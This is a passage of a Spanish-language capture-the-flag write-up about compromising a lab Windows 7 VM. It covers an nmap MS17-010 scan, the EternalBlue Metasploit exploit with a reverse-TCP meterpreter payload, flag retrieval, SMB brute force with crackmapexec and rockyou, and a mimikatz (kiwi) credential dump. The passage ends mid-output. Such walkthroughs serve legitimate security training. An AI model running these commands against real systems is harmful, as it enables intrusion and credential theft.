+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">445</span> --script smb-vuln-ms17-010 192.168.1.10
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-20 21:32 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.10
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00081s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>MAC Address: 03:00:01:1G:22:09 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb-vuln-ms17-010: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE
+</span></span><span style="display:flex;"><span>|     IDs:  CVE:CVE-2017-0143
+</span></span><span style="display:flex;"><span>|     Risk factor: HIGH
+</span></span><span style="display:flex;"><span>|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+</span></span><span style="display:flex;"><span>|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|           
+</span></span><span style="display:flex;"><span>|     Disclosure date: 2017-03-14
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+</span></span><span style="display:flex;"><span>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</span></span><span style="display:flex;"><span>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.33 seconds
+</span></span></code></pre></div><p>Con esto es suficiente para saber que Exploit debemos usar.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="eternalBlue">Aplicando Ataque Eternal Blue (MS17-010) con Metasploit Framework</h3>
+<p>Existen muchas opciones que podemos usar para aplicar este ataque, pero en mi caso, ninguno de los siguientes funcionó:</p>
+<ul>
+<li><a href="https://github.com/worawit/MS17-010" target="_blank">Repositorio de worawit: MS17-010</a></li>
+<li><a href="https://github.com/3ndG4me/AutoBlue-MS17-010" target="_blank">Repositorio de 3ndG4me: AutoBlue-MS17-010</a></li>
+<li><a href="https://github.com/totekuh/eternalblue" target="_blank">Repositorio de totekuh: eternalblue</a></li>
+</ul>
+<p>Y tampoco funcionó la versión que tiene Kali en su BD: <strong>Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &lsquo;EternalBlue&rsquo; SMB Remote Code Execution (MS17-010)</strong>.</p>
+<p>Que, de igual forma, aquí hay un blog que explica cómo usarlo:</p>
+<ul>
+<li><a href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit" target="_blank">Repositorio de AnikateSawhney: Pwning_Blue_From_HTB_Without_Metasploit</a></li>
+</ul>
+<p>Parece que el error común, es que no puede utilizar ninguna de las <strong>named pipes</strong> para aplicar el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python eternalBlue.py 192.168.1.10
+</span></span><span style="display:flex;"><span>Target OS: Windows <span style="color:#ae81ff">7</span> Home Basic <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Not found accessible named pipe
+</span></span><span style="display:flex;"><span>Done
+</span></span></code></pre></div><p>O también puede indicar que no se pudo obtener acceso o en el peor caso, crashea la máquina víctima, haciendo que se reinicie.</p>
+<p>Caso contrario con la versión de <strong>Metasploit Framework</strong>, que vamos a usar a continuación.</p>
+<p>Sigue los pasos:</p>
+<ul>
+<li>Inicia <strong>metasploit</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole -q
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting persistent handler<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>...
+</span></span><span style="display:flex;"><span>msf6 &gt;
+</span></span></code></pre></div><ul>
+<li>Busca el Exploit de <strong>Eternal Blue</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; search eternalblue
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                           Disclosure Date  Rank     Check  Description</span>
+</span></span><span style="display:flex;"><span>   -   ----                                           ---------------  ----     -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li>Usa el siguiente módulo <code>exploit/windows/smb/ms17_010_eternalblue</code> y ve las opciones que necesita el Exploit:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name           Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----           ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   RHOSTS                          yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span style="display:flex;"><span>   RPORT          <span style="color:#ae81ff">445</span>              yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SMBDomain                       no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The Windows domain to use <span style="color:#66d9ef">for</span> authentication. Only affects Windows Server <span style="color:#ae81ff">2008</span> R2, Windows 7, Windows Embedded Standard <span style="color:#ae81ff">7</span> target machines.
+</span></span><span style="display:flex;"><span>   SMBPass                         no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   SMBUser                         no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The username to authenticate as
+</span></span><span style="display:flex;"><span>   VERIFY_ARCH    true             yes       Check <span style="color:#66d9ef">if</span> remote architecture matches exploit Target. Only affects Windows Server <span style="color:#ae81ff">2008</span> R2, Windows 7, Windows Embedded Standard <span style="color:#ae81ff">7</span> target machines.
+</span></span><span style="display:flex;"><span>   VERIFY_TARGET  true             yes       Check <span style="color:#66d9ef">if</span> remote OS matches exploit Target. Only affects Windows Server <span style="color:#ae81ff">2008</span> R2, Windows 7, Windows Embedded Standard <span style="color:#ae81ff">7</span> target machines.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  thread           yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     Tu_IP	      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Automatic Target
+</span></span></code></pre></div><ul>
+<li>Únicamente le debemos indicar la IP de la máquina víctima, ya todo lo demás está configurado:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.1.10
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.1.10
+</span></span></code></pre></div><ul>
+<li>Y lo ejecutamos:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - Host is likely VULNERABLE to MS17-010! - Windows <span style="color:#ae81ff">7</span> Home Basic <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Connecting to target <span style="color:#66d9ef">for</span> exploitation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - Connection established <span style="color:#66d9ef">for</span> exploitation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - Target OS selected valid <span style="color:#66d9ef">for</span> OS indicated by SMB reply
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - CORE raw buffer dump <span style="color:#f92672">(</span><span style="color:#ae81ff">40</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - 0x00000000  <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">69</span> 6e <span style="color:#ae81ff">64</span> 6f <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">48</span> 6f 6d <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">42</span>  Windows <span style="color:#ae81ff">7</span> Home B
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - 0x00000010  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">63</span>  asic <span style="color:#ae81ff">7601</span> Servic
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - 0x00000020  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">63</span> 6b <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">31</span>                          e Pack <span style="color:#ae81ff">1</span>        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - Target arch selected valid <span style="color:#66d9ef">for</span> arch indicated by DCE/RPC reply
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Trying exploit with <span style="color:#ae81ff">12</span> Groom Allocations.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Sending all but last fragment of exploit packet
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Starting non-paged pool grooming
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - Sending SMBv2 buffers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Sending final SMBv2 buffers.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Sending last fragment of exploit packet!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Receiving response from exploit packet
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - ETERNALBLUE overwrite completed successfully <span style="color:#f92672">(</span>0xC000000D<span style="color:#f92672">)</span>!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Sending egg to corrupted connection.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.10:445 - Triggering free of corrupted buffer.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">203846</span> bytes<span style="color:#f92672">)</span> to 192.168.1.10
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>Tu_IP:4444 -&gt; 192.168.1.10:49159<span style="color:#f92672">)</span> at 2024-11-20 14:51:42 -0600
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-WIN-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.10:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>Muy bien, nos generó una sesión de <strong>meterpreter</strong>.</p>
+<p>Con esto hemos comprometido la máquina víctima y somos el <strong>usuario NT Authority</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer        : MICROCHOFT
+</span></span><span style="display:flex;"><span>OS              : Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>6.1 Build 7601, Service Pack 1<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Architecture    : x64
+</span></span><span style="display:flex;"><span>System Language : en_US
+</span></span><span style="display:flex;"><span>Domain          : WORKGROUP
+</span></span><span style="display:flex;"><span>Logged On Users : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Meterpreter     : x64/windows
+</span></span></code></pre></div><p>Y ya solo buscamos las flags.</p>
+<p>Flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\L</span>ola<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\L</span>ola<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
+</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">282</span>   fil   2024-03-28 10:52:53 -0600  desktop.ini
+</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">32</span>    fil   2024-03-28 10:54:50 -0600  user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Flag del administrador:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dmin<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dmin<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
+</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">32</span>    fil   2024-03-28 10:51:45 -0600  admin.txt.txt
+</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">282</span>   fil   2024-03-28 10:36:15 -0600  desktop.ini
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat admin.txt.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Pero aún podemos hacer una que otra cosilla.</p>
+<h3 id="Crackmapexec">Aplicando Fuerza Bruta a Servicio SMB con crackmapexec</h3>
+<p>Si bien, pudimos haber usado <strong>hydra</strong> para aplicar fuerza bruta, también podemos hacerlo con <strong>crackmapexec</strong>.</p>
+<p>Podemos indicarle a <strong>crackmapexec</strong> que aplique fuerza bruta a un usuario que conozcamos, por ejemplo, al <strong>usuario Admin</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.10 -u <span style="color:#e6db74">&#39;Admin&#39;</span> -p /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>Lo malo, es que nos mostrara todos los intentos fallidos, por lo que es bueno usar un filtro con <strong>grep</strong> o con otra herramienta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.10 -u <span style="color:#e6db74">&#39;Admin&#39;</span> -p /usr/share/wordlists/rockyou.txt | grep <span style="color:#e6db74">&#34;[+]&#34;</span>
+</span></span></code></pre></div><p>Podemos dejarlo un buen rato trabajando, pero no nos va a encontrar ninguna contraseña para ningún usuario.</p>
+<p>Nunca está de más probar lo aprendido.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="Hashes">Obteniendo Hashes NTLM con Módulo Kiwi de Meterpreter</h3>
+<p>Una vez dentro, podemos intentar obtener las credenciales y/o hashes de los usuarios de la máquina.</p>
+<p>Esto lo hacemos cargando el <strong>módulo Kiwi</strong> que carga <strong>Mimikatz</strong> a la sesión de <strong>meterpreter</strong>.</p>
+<p><strong>OJO</strong>: para que funcione este módulo, necesitamos ser el <strong>usuario Administrador</strong>.</p>
+<p>Usémoslo:</p>
+<ul>
+<li>Carga el <strong>módulo Kiwi</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; load kiwi
+</span></span><span style="display:flex;"><span>Loading extension kiwi...
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 <span style="color:#ae81ff">20191125</span> <span style="color:#f92672">(</span>x64/windows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> .## ^ <span style="color:#75715e">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;## v ##&#39;</span>        Vincent LE TOUX            <span style="color:#f92672">(</span> vincent.letoux@gmail.com <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Success.
+</span></span></code></pre></div><ul>
+<li>Veamos si podemos obtener alguna credencial con el comando <code>creds_all</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; creds_all
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving all credentials
+</span></span><span style="display:flex;"><span>wdigest credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username     Domain     Password
+</span></span><span style="display:flex;"><span>--------     ------     --------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>       <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>     <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MICROCHOFT$  WORKGROUP  <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kerberos credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username     Domain     Password
+</span></span><span style="display:flex;"><span>--------     ------     --------
